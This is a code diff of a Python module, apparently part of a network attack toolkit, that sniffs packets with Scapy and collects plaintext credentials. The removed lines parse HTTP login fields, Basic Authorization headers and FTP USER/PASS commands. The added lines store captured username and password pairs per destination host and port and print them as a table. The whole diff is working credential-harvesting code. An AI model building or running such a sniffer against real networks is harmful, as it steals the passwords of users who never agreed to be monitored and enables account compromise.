@@ -1,13 +1,15 @@
-import stream
 import util
-from base64 import b64decode
+from config import pptable
+from collections import namedtuple
 from sniffer import Sniffer
-from re import findall,search
+from password_parser import parse_pkt
 from scapy.all import *
 
 class password_sniffer(Sniffer):
 	""" Sniff and parse passwords from various protocols """
 	def __init__(self):
+		self.passwords = {}	# $host -> [(user, pass, service)]
+		self.purgatory = {} # $host -> {$dport:[user, pass, service]} 
 		super(password_sniffer, self).__init__('Password Sniffer')
 
 	def initialize(self):
@@ -22,32 +24,85 @@ class password_sniffer(Sniffer):
 		return self.source
 	
 	def dump(self, pkt):
-		"""Packet callback; parse packets"""
+		"""Packet callback"""
 		if not pkt is None:
-			# http
-			if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
-				payload = pkt.getlayer(Raw).load
-				if 'username' in payload or 'password' in payload:
-					username = re.search('username=(.*?)(&|$| )',payload)
-					password = re.search('password=(.*?)(&|$| )',payload)
-					if username is not None and password is not None:
-						self.log_msg('Host: %s\nUsername: %s\nPassword: %s'%
-										(pkt[IP].dst,username.groups(0)[0],password.groups(0)[0]))
-				elif 'Authorization:' in payload:
-					# such as routers
-					pw = re.search('Authorization: Basic (.*)',payload)
-					if pw.groups(0) is not None:
-						self.log_msg('Authorization to %s: %s'%(pkt[IP].dst,b64decode(pw.groups(0)[0])))
-			# ftp
-			elif pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 21:
-				payload = str(pkt.sprintf("%Raw.load%"))
-				# strip control characters
-				payload = payload[:-5] 
-				prnt = None
-				if 'USER' in payload:
-					prnt = "Host: %s\n[!] User: %s "%(pkt[IP].dst,findall("(?i)USER (.*)", payload)[0])
-				elif 'PASS' in payload:
-					prnt = 'Pass: %s'%findall("(?i)PASS (.*)", payload)[0]
-				if not prnt is None:
-					self.log_msg(prnt)
-			# TODO: other protos....
+			(usr, pswd) = parse_pkt(pkt)
+			if not usr is None: 
+				self.log_msg('Host: %s\n[!] User: %s'%(pkt[IP].dst,usr))
+			if not pswd is None: self.log_msg('Password: %s'%pswd)
+		
+			if usr is not None and pswd is not None:
+				self.add_account_pw((usr,pswd,'%s:%s'%(pkt[IP].dst,pkt[TCP].dport)), pkt)
+			elif not usr is None or not pswd is None:
+				self.add_account(usr,pswd,pkt)
+
+	def add_account(self, username, password, pkt):
+		""" Add the username/password to the local cache.  Because
+			of the way that we process packets, we use a 'purgatory' cache
+			that keeps track of usernames and destination hosts temporarily.
+			Once we see the password entry, we update the cache and insert
+			the entry into the table.
+
+			For example, using FTP:
+				User packet comes through: ('admin', None, destination:port)
+				is added to temp cache.
+
+				User packet comes through: (None, 'passw0rd', destination:port)
+				is generated and, because we have a purgatory entry with a None
+				password entry and a matching destination:port, we update it,
+				remove it from the temp cache, and insert it into the real table.
+
+			This allows us to store multiple half-complete entries for the same
+			protocol on a different host.  If we attempt to insert a half-complete
+			entry into temp cache where one exists for destination:port, we'll 
+			log that entry anyways (i.e. username came twice before password) as
+			it could contain important information, such as the user entering their
+			password in as username, or different account names on other systems.
+		"""
+		host = pkt[IP].dst
+		entry = [username, password, '%s:%s'%(pkt[IP].dst, pkt[TCP].dport)]
+		# is this destination in purgatory?
+		if host in self.purgatory.keys():
+			# it is, are we kicking one out?
+			if pkt[TCP].dport in self.purgatory[host].keys():
+				# there's an entry here, check if the password is none 
+				if self.purgatory[host][pkt[TCP].dport][1] is None:
+					# update with password, log, and delete
+					self.purgatory[host][pkt[TCP].dport][1] = entry[1]
+					self.add_account_pw(tuple(self.purgatory[host][pkt[TCP].dport]), pkt)
+					del(self.purgatory[host][pkt[TCP].dport])
+				else:
+					# its not, log this attempt and start over
+					self.add_account_pw(tuple(self.purgatory[host][pkt[TCP].dport]), pkt)
+					self.purgatory[host][pkt[TCP].dport] = entry
+			else:
+				# nope, new entry
+				self.purgatory[host][pkt[TCP].dport] = entry
+		else:
+			# it isn't, create the entry
+			self.purgatory[host] = {pkt[TCP].dport:entry}
+	
+	def add_account_pw(self, entry, pkt):
+		""" Takes an entry from purgatory and sticks it into
+			the actual password cache if it doesn't exist.
+			@param entry is a tuple of (username,password,destination:port)
+			@pkt is the received packet
+		"""
+		host = pkt[IP].dst
+		if host in self.passwords.keys():
+			if not entry in self.passwords[host]:
+				self.passwords[host].append(entry)
+		else:
+			self.passwords[host] = [entry]
+
+	def view(self):
+		""" Iterate through all usernames/passwords
+		"""
+		table = []
+		Row = namedtuple('Row', ['Username', 'Password', 'Destination'])
+		for key in self.passwords.keys():
+			for account in self.passwords[key]:
+				table.append(Row(account[0],account[1],account[2]))
+		pptable(table)
+
+		super(password_sniffer,self).view()
